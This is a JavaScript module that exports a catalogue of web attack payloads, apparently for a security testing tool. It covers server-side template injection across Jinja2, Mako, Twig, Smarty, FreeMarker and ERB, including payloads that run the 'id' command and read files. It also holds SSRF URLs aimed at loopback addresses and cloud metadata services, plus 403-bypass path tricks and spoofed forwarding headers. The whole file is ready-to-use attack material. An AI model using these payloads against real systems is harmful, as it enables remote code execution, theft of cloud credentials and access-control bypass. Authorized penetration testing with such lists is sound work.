const entries = [];
function add(category, section, rows, options = {}) {
  for (const [label, template] of rows) entries.push({id:`extra-${category.toLowerCase()}-${entries.length + 1}`, category, section, label, template, ...options});
}

add('SSTI', 'Detection / fingerprinting', [
  ['Curly arithmetic → 49', '{{7*7}}'], ['String multiplication fingerprint', "{{7*'7'}}"],
  ['Dollar expression → 49', '${7*7}'], ['Hash expression → 49', '#{7*7}'],
  ['ERB expression → 49', '<%= 7*7 %>'], ['Razor expression → 49', '@(7*7)'],
  ['Thymeleaf expression → 49', '[[${7*7}]]'], ['Thymeleaf selection expression', '*{7*7}'],
  ['FreeMarker alternative syntax', '[=7*7]'], ['Pug interpolation', '#{7*7}'],
  ['Smarty arithmetic', '{7*7}'], ['Template error probe', '${{<%[%\'"}}%\\.'],
  ['Curly division-by-zero probe', '{{1/0}}'], ['Dollar division-by-zero probe', '${1/0}'],
  ['Boolean true probe', '{{7*7==49}}']
]);
add('SSTI', 'Python / Jinja2 / Flask', [
  ['Jinja config object', '{{config}}'], ['Jinja config items', '{{config.items()}}'],
  ['Jinja debug extension', '{% debug %}'], ['Jinja self object', '{{self}}'],
  ['Python object type', "{{''.__class__}}"], ['Python MRO', "{{''.__class__.__mro__}}"],
  ['Python subclasses', "{{''.__class__.__mro__[1].__subclasses__()}}"],
  ['Jinja context builtins', '{{self.__init__.__globals__.__builtins__}}'],
  ['Jinja cycler identity command', "{{cycler.__init__.__globals__.os.popen('id').read()}}"],
  ['Jinja joiner identity command', "{{joiner.__init__.__globals__.os.popen('id').read()}}"],
  ['Flask file read', "{{get_flashed_messages.__globals__.__builtins__.open('{{file}}').read()}}"],
  ['Jinja boolean branch', '{% if 7*7 == 49 %}marker{% endif %}']
]);
add('SSTI', 'Python / Django / Mako / Tornado', [
  ['Django add filter → 49', '{{7|add:42}}'], ['Django debug', '{% debug %}'],
  ['Django CSRF engine check', '{% csrf_token %}'],
  ['Mako identity command', '${__import__("os").popen("id").read()}'],
  ['Mako file read', '${open("{{file}}").read()}'],
  ['Tornado import probe', '{% import os %}{{os.name}}']
]);
add('SSTI', 'PHP / Twig / Smarty / Blade', [
  ['Twig context', '{{dump(_context)}}'], ['Twig app context', '{{dump(app)}}'],
  ['Twig server values', "{{app.request.server.all|join(',')}}"],
  ['Twig identity via map', "{{['id']|map('system')|join}}"],
  ['Twig identity via filter', "{{['id']|filter('system')}}"],
  ['Twig file excerpt extension', "{{'{{file}}'|file_excerpt(1,30)}}"],
  ['Smarty version', '{$smarty.version}'], ['Smarty identity (before v5)', "{system('id')}"],
  ['Smarty PHP block (legacy)', '{php}echo phpversion();{/php}'],
  ['Blade PHP version', '{{phpversion()}}']
]);
add('SSTI', 'Java / FreeMarker / Velocity / EL / Thymeleaf', [
  ['FreeMarker version', '${.version}'], ['FreeMarker identity command', '${"freemarker.template.utility.Execute"?new()("id")}'],
  ['FreeMarker assign and execute', '<#assign exec="freemarker.template.utility.Execute"?new()>${exec("id")}'],
  ['Velocity assignment → 49', '#set($value=7*7)$value'],
  ['Java EL class probe', '${"".getClass().getName()}'],
  ['Spring Java version', '${T(java.lang.System).getProperty("java.version")}'],
  ['Spring operating system', '${T(java.lang.System).getProperty("os.name")}'],
  ['Thymeleaf Java version', '[[${T(java.lang.System).getProperty("java.version")}]]'],
  ['Thymeleaf preprocessing', '__${7*7}__'], ['Jinjava string method', "{{'probe'.toUpperCase()}}"]
]);
add('SSTI', 'Ruby / JavaScript / ASP.NET / Elixir', [
  ['ERB Ruby version', '<%= RUBY_VERSION %>'], ['ERB file read', '<%= File.read("{{file}}") %>'],
  ['ERB identity command', '<%= `id` %>'], ['Slim arithmetic', '#{ 7 * 7 }'],
  ['Handlebars with helper', '{{#with "marker"}}{{this}}{{/with}}'],
  ['Handlebars object lookup', '{{lookup this "constructor"}}'],
  ['Lodash arithmetic', '<%= 7*7 %>'], ['Pug arithmetic', '- var probe = 7*7\n= probe'],
  ['Razor environment version', '@(System.Environment.Version)'],
  ['EEx arithmetic', '<%= 7 * 7 %>'], ['EEx runtime version', '<%= System.version() %>']
]);

add('SSRF', 'Local targets / address forms', [
  ['Configured host and port', 'http://{{host}}:{{port}}/'],
  ['Localhost', 'http://localhost/'], ['IPv4 loopback', 'http://127.0.0.1/'],
  ['IPv4 unspecified', 'http://0.0.0.0/'], ['Short loopback', 'http://127.1/'],
  ['Short zero address', 'http://0/'], ['Loopback subnet', 'http://127.0.1.3/'],
  ['Decimal loopback', 'http://2130706433/'], ['Hex loopback', 'http://0x7f000001/'],
  ['Octal loopback', 'http://0177.0.0.1/'], ['Dotted hexadecimal', 'http://0x7f.0x0.0x0.0x1/'],
  ['IPv6 loopback', 'http://[::1]/'], ['Expanded IPv6 loopback', 'http://[0000::1]/'],
  ['IPv4-mapped IPv6', 'http://[::ffff:127.0.0.1]/'],
  ['IPv6 unspecified', 'http://[::]/'], ['Localhost trailing dot', 'http://localhost./']
]);
add('SSRF', 'Parser / encoding checks', [
  ['Userinfo destination', 'http://example.com@127.0.0.1/'],
  ['Reverse userinfo interpretation', 'http://127.0.0.1@example.com/'],
  ['Fragment hostname check', 'http://127.0.0.1/#example.com'],
  ['Backslash parser check', 'http://127.0.0.1\\@example.com/'],
  ['Encoded hostname', 'http://%31%32%37.0.0.1/'],
  ['Encoded path', 'http://127.0.0.1/%61dmin'], ['Double encoded path', 'http://127.0.0.1/%2561dmin'],
  ['Single slash scheme', 'http:/127.0.0.1/'], ['Scheme without slashes', 'http:127.0.0.1/'],
  ['Configured callback', 'http://{{host}}:{{port}}/ssrf-probe']
]);
add('SSRF', 'URL schemes', [
  ['File read URL', 'file://{{file}}'], ['FTP URL', 'ftp://{{host}}:{{port}}/'],
  ['DICT service probe', 'dict://{{host}}:{{port}}/'],
  ['Gopher HTTP request', 'gopher://{{host}}:{{port}}/_GET%20/%20HTTP/1.0%0D%0A%0D%0A'],
  ['LDAP URL', 'ldap://{{host}}:{{port}}/'], ['TFTP file URL', 'tftp://{{host}}:{{port}}/{{relative_file}}'],
  ['JAR URL parser check', 'jar:http://{{host}}:{{port}}/probe.jar!/probe.txt']
]);
add('SSRF', 'Cloud metadata / service discovery', [
  ['AWS metadata index', 'http://169.254.169.254/latest/meta-data/'],
  ['AWS instance identity', 'http://169.254.169.254/latest/dynamic/instance-identity/document'],
  ['AWS IMDSv2 token endpoint (PUT required)', 'http://169.254.169.254/latest/api/token'],
  ['AWS IPv6 metadata', 'http://[fd00:ec2::254]/latest/meta-data/'],
  ['Decimal metadata IP', 'http://2852039166/latest/meta-data/'],
  ['Hex metadata IP', 'http://0xa9fea9fe/latest/meta-data/'],
  ['GCP metadata (Metadata-Flavor required)', 'http://metadata.google.internal/computeMetadata/v1/'],
  ['Azure metadata (Metadata header required)', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'],
  ['DigitalOcean metadata', 'http://169.254.169.254/metadata/v1/'],
  ['OpenStack metadata', 'http://169.254.169.254/openstack/latest/meta_data.json'],
  ['Docker API version', 'http://127.0.0.1:2375/version'],
  ['Kubernetes API version', 'https://kubernetes.default.svc/version']
]);
add('SSRF', 'Metadata request headers', [
  ['GCP metadata header', 'Metadata-Flavor: Google'], ['Azure metadata header', 'Metadata: true'],
  ['IMDSv2 token TTL header', 'X-aws-ec2-metadata-token-ttl-seconds: 60']
], {target:'headers'});

add('403-bypass', 'Path variants', [
  ['Trailing slash', '{{origin}}{{path}}/'], ['Double leading slash', '{{origin}}/{{path}}'],
  ['Double trailing slash', '{{origin}}{{path}}//'], ['Leading encoded dot', '{{origin}}/%2e{{path}}'],
  ['Dot path segments (browser normalized)', '{{origin}}/.{{path}}/./'],
  ['Trailing dot (browser normalized)', '{{origin}}{{path}}/.'],
  ['Semicolon suffix', '{{origin}}{{path}}..;/'], ['Semicolon path segment', '{{origin}}{{path}}/..;/'],
  ['Encoded space suffix', '{{origin}}{{path}}%20'], ['Encoded tab suffix', '{{origin}}{{path}}%09'],
  ['Encoded NUL suffix', '{{origin}}{{path}}%00'], ['JSON suffix', '{{origin}}{{path}}.json'],
  ['CSS suffix', '{{origin}}{{path}}.css'], ['HTML suffix', '{{origin}}{{path}}.html'],
  ['Empty query', '{{origin}}{{path}}?'], ['Double query marker', '{{origin}}{{path}}??'],
  ['Triple query marker', '{{origin}}{{path}}???'], ['Query parameter', '{{origin}}{{path}}?probe=1'],
  ['Encoded slash suffix', '{{origin}}{{path}}%2f'], ['Semicolon extension', '{{origin}}{{path}};.css']
], {target:'url'});
add('403-bypass', 'URL rewrite headers', [
  ['Original URL override', 'X-Original-URL: {{path}}'], ['Rewrite URL override', 'X-Rewrite-URL: {{path}}'],
  ['Forwarded URI override', 'X-Forwarded-Uri: {{path}}'],
  ['Method override POST', 'X-HTTP-Method-Override: POST'], ['Method override GET', 'X-HTTP-Method-Override: GET'],
  ['Original method POST', 'X-Original-Method: POST']
], {target:'headers'});
const ipHeaders = ['X-Custom-IP-Authorization','X-Forwarded-For','X-Forward-For','X-Remote-IP','X-Originating-IP','X-Remote-Addr','X-Client-IP','X-Real-IP'];
const ipForms = ['127.0.0.1','localhost','localhost:80','localhost:443','127.0.0.1:80','127.0.0.1:443','2130706433','0x7F000001','0177.0000.0000.0001','0','127.1','10.0.0.0','10.0.0.1','172.16.0.0','172.16.0.1','192.168.1.0','192.168.1.1'];
for (const header of ipHeaders) add('403-bypass', header, ipForms.map(value => [`${header}: ${value}`, `${header}: ${value}`]), {target:'headers'});
add('403-bypass', 'Forwarded chains', [
  ['RFC Forwarded loopback', 'Forwarded: for=127.0.0.1;host=localhost;proto=http'],
  ['Forwarded chain first hop', 'X-Forwarded-For: 127.0.0.1, 8.8.8.8'],
  ['Forwarded chain last hop', 'X-Forwarded-For: 8.8.8.8, 127.0.0.1']
], {target:'headers'});

export const EXTRA_PAYLOADS = entries;
